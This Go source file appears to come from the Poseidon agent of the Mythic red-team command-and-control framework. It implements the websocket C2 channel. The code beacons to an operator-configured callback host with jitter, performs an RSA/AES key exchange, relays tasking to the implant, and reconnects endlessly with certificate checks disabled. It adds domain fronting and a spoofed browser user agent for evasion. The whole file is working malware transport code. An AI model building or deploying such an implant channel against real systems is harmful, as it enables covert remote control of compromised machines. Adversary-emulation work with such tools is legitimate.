//go:build (linux || darwin) && websocket
// +build linux darwin
// +build websocket

package profiles

import (
	"crypto/rsa"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"

	// 3rd Party

	"github.com/gorilla/websocket"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// Websocket C2 profile variables from https://github.com/MythicC2Profiles/websocket/blob/master/C2_Profiles/websocket/mythic/c2_functions/websocket.py
// All variables must be a string so they can be set with ldflags

// callback_host is used to create the BaseURL value in the Websocket C2 profile
var callback_host string

// callback_port is used to create the BaseURL value in the Websocket C2 profile
var callback_port string

// USER_AGENT is the HTTP User-Agent header value
var USER_AGENT string

// AESPSK is Base64 of a 32B AES Key
var AESPSK string

// callback_interval is the callback interval in seconds
var callback_interval string

// encrypted_exchange_check is set to True or False to determine if Poseidon should do a key exchange
var encrypted_exchange_check string

// domain_front the Host header value for domain fronting
var domain_front string

// ENDPOINT_REPLACE is the websockets endpoint
var ENDPOINT_REPLACE string

// callback_jitter is the callback jitter in percent
var callback_jitter string

type C2Websockets struct {
	HostHeader     string
	BaseURL        string
	Interval       int
	Jitter         int
	ExchangingKeys bool
	UserAgent      string
	Key            string
	RsaPrivateKey  *rsa.PrivateKey
	Conn           *websocket.Conn
	Endpoint       string
}

// New creates a new HTTP C2 profile from the package's global variables and returns it
func New() structs.Profile {
	var final_url string
	var last_slash int
	if callback_port == "443" && strings.Contains(callback_host, "wss://") {
		final_url = callback_host
	} else if callback_port == "80" && strings.Contains(callback_host, "ws://") {
		final_url = callback_host
	} else {
		last_slash = strings.Index(callback_host[8:], "/")
		if last_slash == -1 {
			//there is no 3rd slash
			final_url = fmt.Sprintf("%s:%s", callback_host, callback_port)
		} else {
			//there is a 3rd slash, so we need to splice in the port
			last_slash += 8 // adjust this back to include our offset initially
			//fmt.Printf("index of last slash: %d\n", last_slash)
			//fmt.Printf("splitting into %s and %s\n", string(callback_host[0:last_slash]), string(callback_host[last_slash:]))
			final_url = fmt.Sprintf("%s:%s%s", string(callback_host[0:last_slash]), callback_port, string(callback_host[last_slash:]))
		}
	}
	if final_url[len(final_url)-1:] != "/" {
		final_url = final_url + "/"
	}
	profile := C2Websockets{
		HostHeader: domain_front,
		BaseURL:    final_url,
		UserAgent:  USER_AGENT,
		Key:        AESPSK,
		Endpoint:   ENDPOINT_REPLACE,
	}

	// Convert sleep from string to integer
	i, err := strconv.Atoi(callback_interval)
	if err == nil {
		profile.Interval = i
	} else {
		profile.Interval = 10
	}

	// Convert jitter from string to integer
	j, err := strconv.Atoi(callback_jitter)
	if err == nil {
		profile.Jitter = j
	} else {
		profile.Jitter = 23
	}

	if encrypted_exchange_check == "true" {
		profile.ExchangingKeys = true
	}

	if len(profile.UserAgent) <= 0 {
		profile.UserAgent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
	}

	return &profile
}

func (c *C2Websockets) Start() {
	// Checkin with Mythic via an egress channel
	resp := c.CheckIn()
	checkIn := resp.(structs.CheckInMessageResponse)
	// If we successfully checkin, get our new ID and start looping
	if strings.Contains(checkIn.Status, "success") {
		SetMythicID(checkIn.ID)
		for {
			// loop through all task responses
			message := CreateMythicMessage()
			encResponse, _ := json.Marshal(message)
			//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
			resp := c.SendMessage(encResponse).([]byte)
			if len(resp) > 0 {
				//fmt.Printf("Raw resp: \n %s\n", string(resp))
				taskResp := structs.MythicMessageResponse{}
				err := json.Unmarshal(resp, &taskResp)
				if err != nil {
					//log.Printf("Error unmarshal response to task response: %s", err.Error())
					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
					continue
				}
				HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
			}
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
		}
	} else {
		fmt.Printf("Uh oh, failed to checkin\n")
	}
}

func (c *C2Websockets) GetSleepTime() int {
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}

func (c *C2Websockets) SetSleepInterval(interval int) string {
	if interval >= 0 {
		c.Interval = interval
		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
	} else {
		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
	}

}

func (c *C2Websockets) SetSleepJitter(jitter int) string {
	if jitter >= 0 && jitter <= 100 {
		c.Jitter = jitter
		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
	} else {
		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
	}
}

func (c *C2Websockets) ProfileType() string {
	return "websocket"
}

func (c *C2Websockets) CheckIn() interface{} {
	// Establish a connection to the websockets server
	url := fmt.Sprintf("%s%s", c.BaseURL, c.Endpoint)
	header := make(http.Header)
	header.Set("User-Agent", c.UserAgent)

	// Set the host header
	if len(c.HostHeader) > 0 {
		header.Set("Host", c.HostHeader)
	}

	d := websocket.Dialer{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	for true {
		connection, _, err := d.Dial(url, header)
		if err != nil {
			log.Printf("Error connecting to server %s ", err.Error())
			//return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}
		c.Conn = connection
		break
	}

	//log.Println("Connected to server ")
	checkin := CreateCheckinMessage()
	checkinMsg, _ := json.Marshal(checkin)

	if c.ExchangingKeys {
		for !c.NegotiateKey() {

		}
	}
	resp := c.sendData("", checkinMsg).([]byte)
	response := structs.CheckInMessageResponse{}
	err := json.Unmarshal(resp, &response)
	if err != nil {
		//log.Printf("Error unmarshaling response: %s", err.Error())
		return structs.CheckInMessageResponse{Status: "failed"}
	}

	if len(response.ID) > 0 {
		SetMythicID(response.ID)
	}
	//fmt.Printf("Sucessfully negotiated a connection\n")
	return response
}

func (c *C2Websockets) SendMessage(output []byte) interface{} {
	return c.sendData("", output)
}

func (c *C2Websockets) NegotiateKey() bool {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	//initMessage := structs.EKEInit{}
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)

	if err != nil {
		log.Printf("Error marshaling data: %s", err.Error())
		return false
	}
	resp := c.sendData("", raw).([]byte)

	//decryptedResponse := crypto.RsaDecryptCipherBytes(resp, c.RsaPrivateKey)
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		log.Printf("Error unmarshaling RsaResponse %s", err.Error())
		return false
	}

	//log.Printf("Received EKE response: %+v\n", sessionKeyResp)
	// Save the new AES session key
	encryptedSesionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSesionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	c.ExchangingKeys = false

	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID)
	} else {
		return false
	}
	return true
}

func (c *C2Websockets) reconnect() {
	header := make(http.Header)
	header.Set("User-Agent", c.UserAgent)
	if len(c.HostHeader) > 0 {
		header.Set("Host", c.HostHeader)
	}
	d := websocket.Dialer{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	url := fmt.Sprintf("%s%s", c.BaseURL, c.Endpoint)
	for true {
		connection, _, err := d.Dial(url, header)
		if err != nil {
			//log.Printf("Error connecting to server %s ", err.Error())
			//return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}
		c.Conn = connection
		break
	}
}

func (c *C2Websockets) sendData(tag string, sendData []byte) interface{} {
	m := structs.Message{}
	if len(c.Key) != 0 {
		sendData = c.encryptMessage(sendData)
	}

	if GetMythicID() != "" {
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
	} else {
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	}
	sendData = []byte(base64.StdEncoding.EncodeToString(sendData))
	for true {
		m.Client = true
		m.Data = string(sendData)
		m.Tag = tag
		//log.Printf("Sending message %+v\n", m)
		err := c.Conn.WriteJSON(m)
		if err != nil {
			//log.Printf("%v", err);
			c.reconnect()
			continue
		}
		// Read the response
		resp := structs.Message{}
		err = c.Conn.ReadJSON(&resp)

		if err != nil {
			//log.Println("Error trying to read message ", err.Error())
			c.reconnect()
			continue
		}

		raw, err := base64.StdEncoding.DecodeString(resp.Data)
		if err != nil {
			//log.Println("Error decoding base64 data: ", err.Error())
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}

		if len(raw) < 36 {
			//log.Println("length of data < 36")
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}

		enc_raw := raw[36:] // Remove the Payload UUID

		if len(c.Key) != 0 {
			//log.Printf("Decrypting data")
			enc_raw = c.decryptMessage(enc_raw)
			if len(enc_raw) == 0 {
				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
				continue
			}
		}

		return enc_raw
	}

	return make([]byte, 0)
}

func (c *C2Websockets) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}
func (c *C2Websockets) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
